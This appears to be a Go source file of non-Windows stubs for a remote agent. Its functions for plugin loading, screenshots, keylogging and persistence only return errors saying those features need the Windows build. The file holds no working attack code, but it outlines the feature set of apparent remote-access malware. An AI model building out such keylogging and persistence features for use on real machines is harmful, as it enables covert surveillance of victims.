//go:build !windows

package main

import (
	"errors"
	"net/http"
	"os/exec"
)

func newCommand(name string, args ...string) *exec.Cmd {
	return exec.Command(name, args...)
}

func loadPluginPE(*http.Client, *config, string, string, string) (string, error) {
	return "", errors.New("PE plugins require the Windows agent build")
}

func runPluginChild([]string) error {
	return errors.New("plugin child mode requires the Windows agent build")
}

func captureScreenshot() (string, error) { return "", errors.New("screenshots require Windows") }

func keylogAction(string) (string, string, error) {
	return "", "output", errors.New("keylogging requires Windows")
}

func persistenceAction(bool, *config) (string, error) {
	return "", errors.New("persistence requires Windows")
}
